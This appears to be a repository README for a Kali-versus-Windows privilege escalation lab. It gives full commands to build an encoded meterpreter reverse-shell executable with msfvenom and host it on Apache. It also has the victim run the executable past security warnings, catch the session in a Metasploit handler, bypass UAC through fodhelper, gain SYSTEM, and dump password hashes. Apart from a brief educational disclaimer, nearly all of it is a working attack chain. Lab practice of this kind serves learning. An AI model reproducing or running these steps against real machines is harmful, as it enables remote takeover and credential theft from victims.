# Privilege Escalation

This repository demonstrates a hands-on lab for privilege escalation on a vulnerable Windows machine using a Kali Linux attacker machine. The lab showcases how to exploit vulnerabilities to gain higher privileges and includes detailed steps for exploitation and escalation.

---

## Objectives

* Demonstrate how to escalate privileges on a victim machine by exploiting its vulnerabilities.
* Perform exploitation using Metasploit Framework.
* Understand how to bypass User Account Control (UAC) and gain elevated privileges.

---

## Prerequisites

* **Kali Linux** virtual machine with networking configured.
* **Windows 10** virtual machine with networking configured.
* Both VMs must be on the same network and have connectivity.

---

## Workflow

### 1. Setup Apache to Share Exploit File

Run the script to configure Apache and set up the shared folder for delivering the malicious payload.

```bash
./setup_apache.sh
```

This will:

* Install Apache if not already installed.
* Configure the Apache server to host a directory for sharing files.
* Copy the malicious payload `Exploit.exe` to the shared directory.

### 2. Create the Exploit File

Generate the malicious payload using `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<KALI_IP> -f exe > Desktop/Exploit.exe
```

Replace `<KALI_IP>` with your Kali machine's IP address.

### 3. Start Apache Server

Ensure Apache is running:

```bash
sudo service apache2 start
```

The malicious payload will be accessible via `http://<KALI_IP>/share/Exploit.exe`.

### 4. Start Metasploit Handler

Prepare Kali to catch the connection when the victim runs the payload:

1. Open a terminal and start Metasploit:

   ```bash
   msfconsole
   ```

2. Run the following commands in Metasploit:

   ```
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <KALI_IP>
   exploit -j -z
   ```

This starts the listener and prepares to catch incoming connections from the victim machine.

### 5. Perform Exploitation

On the Windows 10 victim machine:

1. Open a browser and navigate to: `http://<KALI_IP>/share/`.
2. Download and run `Exploit.exe`. If prompted with a security warning, click **Run**.

### 6. Meterpreter Session

After the victim executes the payload, a Meterpreter session will open on Kali. Use the following commands:

* List active sessions:

  ```
  sessions
  ```

* Interact with the session:

  ```
  sessions -i <ID>
  ```

Replace `<ID>` with the session ID displayed in the `sessions` command output.

### 7. Privilege Escalation

To escalate privileges:

1. Attempt privilege escalation:

   ```
   getsystem
   ```

2. If this fails, bypass User Account Control (UAC):

   ```
   use exploit/windows/local/bypassuac_fodhelper
   set SESSION <ID>
   run
   ```

3. Once UAC is bypassed, re-run `getsystem`:

   ```
   getsystem
   ```

4. Verify elevated privileges:

   ```
   getuid
   ```

   You should see: `NT AUTHORITY\SYSTEM`.

---
### 8. Dump Password Hashes
 ```bash
run post/windows/gather/smart_hashdump
```
## Repository Structure

```plaintext
.
├── setup_apache.sh      # Script to set up Apache and share malicious payload.
├── metasploit_commands.sh  # Script containing Metasploit commands.
├── README.md            # Detailed lab documentation.
```

---

## Notes

* Ensure both VMs are on the same network and can communicate.
* For educational purposes only. Do not use these techniques on unauthorized systems.

---

